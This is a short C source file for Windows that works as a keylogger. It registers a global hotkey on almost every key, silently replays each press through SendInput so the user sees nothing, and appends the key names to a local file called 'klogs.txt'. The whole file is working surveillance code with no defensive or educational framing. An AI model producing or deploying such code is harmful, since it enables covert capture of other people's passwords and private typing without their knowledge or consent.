#include<windows.h>

#define DEBUG 0 // Debugging option
#define POLL_TIMEOUT_MS 1000 // Sleep timeout in Milliseconds

#ifdef DEBUG
    #include<stdio.h>
    static void DEBUG_PRINT(const char *msg) 
    {
        fprintf(stdout, "[DEBUG] %s\n", msg);
    }
#endif

void SendKey(BYTE vkKey) 
{
    INPUT input[2] = {0};

    input[0].type = INPUT_KEYBOARD;
    input[0].ki.wVk = vkKey;
    input[0].ki.dwFlags = 0;

    input[1].type = INPUT_KEYBOARD;
    input[1].ki.wVk = vkKey;
    input[1].ki.dwFlags = KEYEVENTF_KEYUP;

    SendInput(2, input, sizeof(INPUT));
}

int main(void) 
{
    HANDLE logfile = CreateFileA("klogs.txt", GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (logfile == INVALID_HANDLE_VALUE) return -1;

    BYTE vk_id_map[256];
    
    int j = 1;
    for (int i = 0x08; i < 0xFE; i++) 
    {
        vk_id_map[i] = j;
        RegisterHotKey(NULL, j, 0, i);
        j++;
    }

    for (;;)
    {
        MSG msg;
        if (!PeekMessageW(&msg, NULL, WM_HOTKEY, WM_HOTKEY, PM_REMOVE)) 
        {
            Sleep(POLL_TIMEOUT_MS);
            continue;
        }

        if (msg.message == WM_HOTKEY) 
        {
            BYTE vkKey = (BYTE)HIWORD(msg.lParam);
            
            UnregisterHotKey(NULL, vk_id_map[vkKey]);
            SendKey(vkKey);
            RegisterHotKey(NULL, vk_id_map[vkKey], 0, vkKey);

            UINT vScnKey = MapVirtualKeyA(vkKey, MAPVK_VK_TO_VSC);
            UINT extended = 0;
            LPARAM lParam = (vScnKey << 16 | extended << 24);

            char real_key[128] = {0};

            if (GetKeyNameTextA(lParam, real_key, sizeof(real_key)) == 0) 
            {
                DEBUG_PRINT("Failed to get name of virtual key!");
                continue;
            }

            DWORD bytesWritten;
            if (!WriteFile(logfile, real_key, strlen(real_key), &bytesWritten, NULL)) 
            {
                DEBUG_PRINT("Failed to write to file!");
                continue;
            }
        }
    }
}

